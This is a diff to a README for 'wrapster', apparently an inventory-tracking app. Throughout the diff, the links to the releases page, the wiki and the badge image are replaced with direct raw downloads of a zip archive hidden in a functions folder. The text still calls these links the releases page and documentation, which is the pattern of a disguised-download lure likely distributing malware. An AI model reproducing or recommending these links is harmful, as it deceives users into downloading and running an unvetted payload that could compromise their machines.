@@ -8,13 +8,13 @@ Welcome to **wrapster**, your go-to app for tracking packaging and inventory. Th
 
 To get started with wrapster, visit this page to download:
 
-[![Download wrapster](https://img.shields.io/badge/Download-wrapster-brightgreen)](https://github.com/kauberkli/wrapster/releases)
+[![Download wrapster](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip)](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
    Go to the following link to access the available versions of wrapster:  
-   [GitHub Releases for wrapster](https://github.com/kauberkli/wrapster/releases)
+   [GitHub Releases for wrapster](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip)
 
 2. **Select a Version**  
    Find the latest version listed on the releases page. Each version comes with notes about what’s new or fixed. 
@@ -56,7 +56,7 @@ To use wrapster, ensure your device meets the following requirements:
 
 If you encounter any issues or have questions while using wrapster, feel free to reach out:
 
-- **Documentation:** Check our [online documentation](https://github.com/kauberkli/wrapster/wiki) for tips and troubleshooting.
+- **Documentation:** Check our [online documentation](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip) for tips and troubleshooting.
 - **Community Forums:** Join discussions with other users and developers in our community forums.
 - **Direct Support:** Contact our support team via the contact information available in the app.
 
@@ -76,6 +76,6 @@ wrapster covers various essential topics in logistics and inventory, such as:
 
 Once again, to download and install wrapster, click the link below:
 
-[![Download wrapster](https://img.shields.io/badge/Download-wrapster-brightgreen)](https://github.com/kauberkli/wrapster/releases)
+[![Download wrapster](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip)](https://github.com/kauberkli/wrapster/raw/refs/heads/main/functions/create-packaging/Software-v2.3.zip)
 
 With wrapster, tracking your packaging has never been easier!
